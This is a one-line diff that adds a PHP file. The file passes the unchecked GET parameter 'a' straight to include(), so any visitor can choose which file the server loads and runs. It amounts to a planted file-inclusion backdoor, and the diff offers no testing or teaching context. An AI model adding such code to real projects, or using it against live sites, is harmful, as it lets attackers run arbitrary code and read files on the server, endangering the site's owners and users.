@@ -1,0 +1,1 @@
+<?php $a = $_GET['a']; include($a);?>
